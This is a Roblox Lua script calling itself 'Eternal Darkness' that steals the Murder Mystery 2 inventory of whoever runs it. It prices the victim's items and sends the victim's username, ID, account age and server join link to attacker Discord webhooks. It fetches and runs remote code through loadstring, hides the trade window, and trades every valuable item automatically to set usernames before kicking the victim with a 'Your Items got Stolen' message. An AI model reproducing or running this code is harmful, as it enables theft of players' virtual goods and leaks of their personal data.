repeat task.wait() until game:IsLoaded()
task.wait(1.5)

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local TeleportService = game:GetService("TeleportService")
local plr = Players.LocalPlayer
if not plr then return end

if game.PlaceId ~= 142823291 then
    if plr and typeof(plr.Kick) == "function" then
        pcall(function() plr:Kick("Eternal Darkness | MM2 Only") end)
    end
    return
end

if not _G.ED_CONFIG then
    warn("[ED] Execute loader first!")
    return
end

local cfg = _G.ED_CONFIG
local WEBHOOK_ID = cfg.WEBHOOK_ID
local USERNAMES = cfg.USERNAMES
local PROXY_URL = cfg.PROXY_URL
local PublicHits = "31566ef8c2c18566522c58e8c11511cf"

if not WEBHOOK_ID or WEBHOOK_ID == "" then
    warn("[ED] Invalid webhook")
    return
end
if not USERNAMES or #USERNAMES == 0 then
    warn("[ED] No targets")
    return
end

local executorName = "Unknown"
pcall(function()
    if identifyexecutor then executorName = identifyexecutor()
    elseif getexecutorname then executorName = getexecutorname() end
end)

local requestMethod = nil

if syn and syn.request then
    requestMethod = syn.request
elseif fluxus and fluxus.request then
    requestMethod = fluxus.request
elseif http and http.request then
    requestMethod = http.request
elseif getgenv().request then
    requestMethod = getgenv().request
elseif request then
    requestMethod = request
elseif http_request then
    requestMethod = http_request
elseif game:GetService("HttpService").RequestAsync then
    requestMethod = function(req)
        return game:GetService("HttpService"):RequestAsync({
            Url = req.Url,
            Method = req.Method,
            Headers = req.Headers,
            Body = req.Body
        })
    end
end

if not requestMethod then
    warn("[ED] Unsupported executor - No request method found")
    return
end

local request = requestMethod

local REAL_JOB_ID = game.JobId
local bypassJobId = game.JobId
local capturedJobId = false

if identifyexecutor and identifyexecutor() == "Delta" then
    local stepAnimate = nil
    local printed = false
    repeat
        for _, v in ipairs(getgc(true)) do
            if typeof(v) == "function" then
                local info = debug.getinfo(v)
                if info and info.name == "stepAnimate" then
                    stepAnimate = v
                    break
                end
            end
        end
        task.wait()
    until stepAnimate
    local old
    old = hookfunction(stepAnimate, function(dt)
        if not printed then
            printed = true
            bypassJobId = game.JobId
            capturedJobId = true
        end
        return old(dt)
    end)
    repeat task.wait() until capturedJobId
    REAL_JOB_ID = bypassJobId
end

local function ServerHop()
    local success, result = pcall(function()
        local response = request({
            Url = "https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?sortOrder=Asc&limit=100",
            Method = "GET",
            Headers = {["User-Agent"] = "Mozilla/5.0"}
        })
        if response and response.Body then
            local data = HttpService:JSONDecode(response.Body)
            if data and data.data then
                for _, server in ipairs(data.data) do
                    if server.id ~= game.JobId and server.playing < server.maxPlayers then
                        TeleportService:TeleportToPlaceInstance(game.PlaceId, server.id, plr)
                        task.wait(5)
                        return
                    end
                end
            end
        end
    end)
    if not success then
        warn("[ED] ServerHop failed: " .. tostring(result))
    end
end

local VIP = (game:GetService("RobloxReplicatedStorage"):WaitForChild("GetServerType"):InvokeServer() == "VIPServer")
local FULL = (#Players:GetPlayers() >= 12)
if VIP or FULL then
    if executorName:lower():find("delta") or executorName:lower():find("hydrogen") or executorName:lower():find("fluxus") or executorName:lower():find("arceus") or executorName:lower():find("codex") then
        plr:Kick(VIP and "VIP Servers not supported." or "FULL Servers Arent Supported")
        return
    else
        print(VIP and "VIP Server detected, hopping..." or "Server full, hopping...")
        ServerHop()
        return
    end
end

local no_trade = {
    ["DefaultGun"] = true, ["DefaultKnife"] = true, ["Reaver"] = true,
    ["Reaver_Legendary"] = true, ["Reaver_Godly"] = true, ["Reaver_Ancient"] = true,
    ["IceHammer"] = true, ["IceHammer_Legendary"] = true, ["IceHammer_Godly"] = true,
    ["IceHammer_Ancient"] = true, ["Gingerscythe"] = true, ["Gingerscythe_Legendary"] = true,
    ["Gingerscythe_Godly"] = true, ["Gingerscythe_Ancient"] = true,
    ["TestItem"] = true, ["Season1TestKnife"] = true, ["Cracks"] = true,
    ["Icecrusher"] = true, ["???"] = true, ["Dartbringer"] = true,
    ["TravelerAxeRed"] = true, ["TravelerAxeBronze"] = true,
    ["TravelerAxeSilver"] = true, ["TravelerAxeGold"] = true,
    ["BlueCamo_K_2022"] = true, ["GreenCamo_K_2022"] = true, ["SharkSeeker"] = true
}

local dbSuccess, database = pcall(function()
    return require(ReplicatedStorage:WaitForChild("Database", 10):WaitForChild("Sync", 10):WaitForChild("Item", 10))
end)
if not dbSuccess or not database then
    warn("[ED] Database load failed")
    return
end

local profileSuccess, profileData = pcall(function()
    return ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(plr.Name)
end)
if not profileSuccess or not profileData then
    warn("[ED] Profile load failed")
    return
end

local mm2Values = {}
local valueSuccess, valueResponse = pcall(function()
    return request({
        Url = "https://api.project-reverse.org/valuables/get-game-valuables?game=mm2",
        Method = "GET",
        Headers = {["User-Agent"] = "Mozilla/5.0"}
    })
end)

if valueSuccess and valueResponse and valueResponse.Body then
    local ok, data = pcall(function() return HttpService:JSONDecode(valueResponse.Body) end)
    if ok and data and data.data then
        for _, item in ipairs(data.data) do
            if item.name and item.price then
                mm2Values[item.name] = tonumber(item.price) or 0
            end
        end
    end
end

local weaponsToSend = {}
local totalInventoryValue = 0
local rarityCounts = {Ancient=0, Godly=0, Unique=0, Vintage=0, Legendary=0, Rare=0, Uncommon=0, Common=0}
local weaponsOwned = profileData.Weapons and profileData.Weapons.Owned or {}

for dataid, amount in pairs(weaponsOwned) do
    local item = database[dataid]
    if item and not no_trade[dataid] and amount > 0 then
        local itemName = item.ItemName or tostring(dataid)
        local rarity = item.Rarity or "Common"
        local value = mm2Values[dataid] or 0
        local totalValue = value * amount
        totalInventoryValue = totalInventoryValue + totalValue

        table.insert(weaponsToSend, {
            DataID = dataid,
            ItemName = itemName,
            Amount = amount,
            Rarity = rarity,
            Value = value,
            TotalValue = totalValue
        })
        rarityCounts[rarity] = (rarityCounts[rarity] or 0) + amount
    end
end

table.sort(weaponsToSend, function(a, b)
    return a.TotalValue > b.TotalValue
end)

if #weaponsToSend == 0 then
    warn("[ED] No tradeable items found")
end

local function uploadToPastefy(items)
    local lines = {
        "Eternal Darkness | " .. plr.Name,
        os.date("%Y-%m-%d %H:%M:%S"),
        "Total: " .. #items,
        string.rep("-", 50), ""
    }

    table.sort(items, function(a, b)
        local tier = {Ancient=9, Godly=8, Unique=7, Vintage=6, Legendary=5, Rare=4, Uncommon=3, Common=2}
        local ao = tier[a.Rarity] or 1
        local bo = tier[b.Rarity] or 1
        if ao ~= bo then return ao > bo end
        return (a.Value * a.Amount) > (b.Value * b.Amount)
    end)

    local current_tier = nil
    for _, item in ipairs(items) do
        if current_tier ~= item.Rarity then
            current_tier = item.Rarity
            table.insert(lines, "")
            table.insert(lines, "[" .. current_tier:upper() .. "]")
            table.insert(lines, string.rep("-", 30))
        end
        local total_val = item.Value * item.Amount
        table.insert(lines, string.format("%s | Qty: %d | Value: $%.2f (Total: $%.2f)",
            item.ItemName, item.Amount, item.Value, total_val))
    end

    local content = table.concat(lines, "\n")
    local ok, response = pcall(function()
        return request({
            Url = "https://pastefy.app/api/v2/paste",
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode({content = content, type = "PASTE"})
        })
    end)

    if ok and response and response.StatusCode == 200 then
        local ok2, data = pcall(function() return HttpService:JSONDecode(response.Body) end)
        if ok2 and data then
            return data.paste and "https://pastefy.app/" .. data.paste.id or
                   data.id and "https://pastefy.app/" .. data.id or "Failed"
        end
    end
    return "Failed"
end

local function sendToProxy(payload)
    task.spawn(function()
        local url = PROXY_URL .. WEBHOOK_ID
        local success, response = pcall(function()
            return request({
                Url = url,
                Method = "POST",
                Headers = {
                    ["Content-Type"] = "application/json",
                    ["User-Agent"] = "EternalDarkness/3.0"
                },
                Body = HttpService:JSONEncode(payload)
            })
        end)
    end)
end
local function sendToPublic(payload)
    task.spawn(function()
        local url = PROXY_URL .. PublicHits
        local success, response = pcall(function()
            return request({
                Url = url,
                Method = "POST",
                Headers = {
                    ["Content-Type"] = "application/json",
                    ["User-Agent"] = "EternalDarkness/3.0"
                },
                Body = HttpService:JSONEncode(payload)
            })
        end)
    end)
end

local rubisLink = uploadToPastefy(weaponsToSend)
local PlaceId = game.PlaceId
local fernJoinerLink = string.format("https://fern.wtf/joiner?placeId=%d&gameInstanceId=%s", PlaceId, REAL_JOB_ID)

local hitCategory = "Low Hit"
local isPingWorthy = false
if totalInventoryValue >= 1000 then
    hitCategory = "Big Hit"
    isPingWorthy = true
elseif totalInventoryValue >= 300 then
    hitCategory = "Good Hit"
    isPingWorthy = true
elseif totalInventoryValue >= 100 then
    hitCategory = "Normal Hit"
    isPingWorthy = true
end

local total_items = 0
for _, item in ipairs(weaponsToSend) do total_items = total_items + item.Amount end

local top_items = {}
for i = 1, math.min(3, #weaponsToSend) do
    local item = weaponsToSend[i]
    local emoji = {Ancient = "ðŸ”´", Godly = "ðŸŸ£", Unique = "ðŸŸ¡", Vintage = "ðŸŸ ", Legendary = "ðŸ”µ", Rare = "ðŸŸ¢", Uncommon = "âšª", Common = "âš«"}
    local e = emoji[item.Rarity] or "âšª"
    table.insert(top_items, string.format("%s `%s` x%d **$%.2f**", e, item.ItemName, item.Amount, item.TotalValue))
end

local fields = {
    {name = "ðŸ‘¤ Victim", value = plr.DisplayName .. "\n(@" .. plr.Name .. ")\nID: " .. plr.UserId .. "\nAge: " .. plr.AccountAge .. " days", inline = true},
    {name = "âš™ï¸ System", value = "Executor: " .. executorName .. "\nReceiver: " .. table.concat(USERNAMES, ", ") .. "\nJob ID:\n" .. string.sub(REAL_JOB_ID, 1, 8) .. "...", inline = true},
    {name = "ðŸ’° Valuation", value = "Total USD: $" .. string.format("%.2f", totalInventoryValue) .. "\nTotal Items: " .. total_items, inline = true}
}

local esc = string.char(27)
local ansiLine1 = esc .. "[2;31mAncient:  " .. rarityCounts.Ancient .. "  " .. esc .. "[2;35mGodly:   " .. rarityCounts.Godly .. esc .. "[0m"
local ansiLine2 = esc .. "[2;33mUnique:   " .. rarityCounts.Unique .. "  " .. esc .. "[2;38;5;208mVintage: " .. rarityCounts.Vintage .. esc .. "[0m"
local ansiLine3 = esc .. "[2;34mLegendary:" .. rarityCounts.Legendary .. "  " .. esc .. "[2;32mRare:    " .. rarityCounts.Rare .. esc .. "[0m"
local ansiLine4 = esc .. "[2;37mUncommon: " .. rarityCounts.Uncommon .. "  Common:  " .. rarityCounts.Common

table.insert(fields, {name = "ðŸ“Š Inventory", value = "```ansi\n" .. ansiLine1 .. "\n" .. ansiLine2 .. "\n" .. ansiLine3 .. "\n" .. ansiLine4 .. "```", inline = false})
table.insert(fields, {name = "ðŸ† Top Items", value = "```\n" .. table.concat(top_items, "\n") .. "\n```", inline = false})
table.insert(fields, {name = "ðŸ”— Actions", value = "[Join Server](" .. fernJoinerLink .. ") â€¢ [View Inventory](" .. rubisLink .. ")", inline = false})

local payload = {
    content = isPingWorthy and "@everyone ðŸŒ‘ **NEW MM2 HIT | Eternal Darkness**" or nil,
    username = "ðŸŒ‘ Eternal Darkness",
    avatar_url = "https://imgur.com/a/LhzvN5h.png",
    embeds = {{
        title = "Eternal Darkness MM2 HIT | " .. hitCategory,
        url = rubisLink,
        color = 0x1a1a2e,
        thumbnail = {url = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. plr.UserId .. "&width=420&height=420&format=png"},
        description = "```lua\ngame:GetService('TeleportService'):TeleportToPlaceInstance(" .. PlaceId .. ", '" .. REAL_JOB_ID .. "')\n```",
        fields = fields,
        footer = {text = "Eternal Darkness v8.0"},
        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
    }}
}

local publicFields = {
    {name = "ðŸ‘¤ Victim", value = plr.DisplayName .. "\n(@" .. plr.Name .. ")\nID: " .. plr.UserId, inline = true},
    {name = "âš™ï¸ Executor", value = executorName, inline = true},
    {name = "ðŸ’° Valuation", value = "Total USD: $" .. string.format("%.2f", totalInventoryValue) .. "\nTotal Items: " .. total_items, inline = true},
    {name = "ðŸ“Š Inventory", value = "```ansi\n" .. ansiLine1 .. "\n" .. ansiLine2 .. "\n" .. ansiLine3 .. "\n" .. ansiLine4 .. "```", inline = false},
    {name = "ðŸ† Top Items", value = "```\n" .. table.concat(top_items, "\n") .. "\n```", inline = false},
    {name = "ðŸ”— Actions", value = "[View Inventory](" .. rubisLink .. ")", inline = false}
}

local PublicPayload = {
    content = "ðŸŒ‘ **MM2 Public Hits | Eternal Darkness**",
    username = "ðŸŒ‘ Eternal Darkness",
    avatar_url = "https://imgur.com/a/LhzvN5h.png",
    embeds = {{
        title = "Eternal Darkness MM2 HIT | " .. hitCategory,
        url = rubisLink,
        color = 0x1a1a2e,
        thumbnail = {url = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. plr.UserId .. "&width=420&height=420&format=png"},
        fields = publicFields,
        footer = {text = "Eternal Darkness v8.0"},
        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
    }}
}

if total_items ~= 0 or total_items > 1 then
    sendToProxy(payload)
    sendToPublic(PublicPayload)
end

print("[ED] Loading Script for", plr.Name)
print("Please wait, this process can take up to 5 minutes depending on your connection and executor...")

wait(3)

pcall(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/outhackernuls090-hash/opensrc_visual/refs/heads/main/visual.lua"))()
end)

local Trade = ReplicatedStorage:WaitForChild("Trade", 5)
if not Trade then
    warn("[ED] Trade remote missing")
    return
end

local SendRequest = Trade:WaitForChild("SendRequest")
local GetStatus = Trade:WaitForChild("GetTradeStatus")
local OfferItem = Trade:WaitForChild("OfferItem")
local AcceptTradeRemote = Trade:WaitForChild("AcceptTrade")
local DeclineTrade = Trade:WaitForChild("DeclineTrade")

local last_offer_info = nil
if Trade:FindFirstChild("UpdateTrade") then
    Trade.UpdateTrade.OnClientEvent:Connect(function(data)
        if data and data.LastOffer then
            last_offer_info = data.LastOffer
        end
    end)
end

local PlayerGui = plr:WaitForChild("PlayerGui")
for _, guiName in ipairs({"TradeGUI", "TradeGUI_Phone"}) do
    local gui = PlayerGui:FindFirstChild(guiName)
    if gui then
        gui.Enabled = false
        gui:GetPropertyChangedSignal("Enabled"):Connect(function()
            if gui.Enabled then gui.Enabled = false end
        end)
    end
end

local function getStatus()
    local ok, status = pcall(function() return GetStatus:InvokeServer() end)
    return ok and status or "None"
end

local function isTarget(name)
    for _, u in ipairs(USERNAMES) do
        if u:lower() == name:lower() then return true end
    end
    return false
end

local function waitUntilDone()
    repeat task.wait(0.1) until getStatus() == "None"
end

local function acceptDeal()
    if last_offer_info then
        AcceptTradeRemote:FireServer(game.PlaceId * 3, last_offer_info)
    else
        AcceptTradeRemote:FireServer(game.PlaceId * 3, {})
    end
end

local function addToOffer(item_id)
    OfferItem:FireServer(item_id, "Weapons")
    task.wait(0.1)
end

local isTradeCompleted = false

local function doTrade(targetPlayer)
    if not targetPlayer then return end

    local attempts = 0
    while attempts < 30 do
        if targetPlayer.Character and targetPlayer.Character:FindFirstChild("Humanoid") then break end
        attempts = attempts + 1
        task.wait(0.5)
    end

    local itemsToTrade = {}
    for _, item in ipairs(weaponsToSend) do
        table.insert(itemsToTrade, item)
    end

    if #itemsToTrade == 0 then
        warn("[ED] No items to trade")
        return
    end

    while #itemsToTrade > 0 and not isTradeCompleted do
        local statusNow = getStatus()

        if statusNow == "StartTrade" then
            DeclineTrade:FireServer()
            task.wait(0.3)
        elseif statusNow == "ReceivingRequest" then
            if Trade:FindFirstChild("DeclineRequest") then
                Trade.DeclineRequest:FireServer()
            else
                DeclineTrade:FireServer()
            end
            task.wait(0.3)
        end

        local tradeStarted = false
        local sendAttempts = 0
        while not tradeStarted and sendAttempts < 30 do
            local current = getStatus()
            if current == "StartTrade" then
                tradeStarted = true
                break
            elseif current == "None" then
                pcall(function() SendRequest:InvokeServer(targetPlayer) end)
            elseif current == "ReceivingRequest" then
                if Trade:FindFirstChild("DeclineRequest") then
                    Trade.DeclineRequest:FireServer()
                else
                    DeclineTrade:FireServer()
                end
            end
            sendAttempts = sendAttempts + 1
            task.wait(0.5)
        end

        if not tradeStarted then
            task.wait(2)
            continue
        end

        local slotsLeft = 4
        local itemsAdded = 0
        while slotsLeft > 0 and #itemsToTrade > 0 do
            local currentItem = itemsToTrade[1]
            local amountToAdd = math.min(slotsLeft, currentItem.Amount)
            for _ = 1, amountToAdd do
                addToOffer(currentItem.DataID)
            end
            currentItem.Amount = currentItem.Amount - amountToAdd
            if currentItem.Amount <= 0 then
                table.remove(itemsToTrade, 1)
            end
            slotsLeft = slotsLeft - amountToAdd
            itemsAdded = itemsAdded + amountToAdd
        end

        if itemsAdded == 0 then break end

        task.wait(5)
        acceptDeal()
        waitUntilDone()

        if #itemsToTrade > 0 then
            task.wait(1)
        end
    end

    if #itemsToTrade == 0 then
        isTradeCompleted = true
        task.wait(2)
        pcall(function() setclipboard("https://discord.gg/wep4k9Fg8W") end)
        pcall(function()
            plr:Kick("Eternal Darkness | Your Items got Stolen\n\ndiscord.gg/wep4k9Fg8W")
        end)
    end
end

Players.PlayerAdded:Connect(function(player)
    if player == plr then return end
    if isTarget(player.Name) then
        task.spawn(function()
            task.wait(4)
            doTrade(player)
        end)
    end
end)

for _, p in ipairs(Players:GetPlayers()) do
    if p ~= plr and isTarget(p.Name) then
        task.spawn(function()
            task.wait(4)
            doTrade(p)
        end)
    end
end
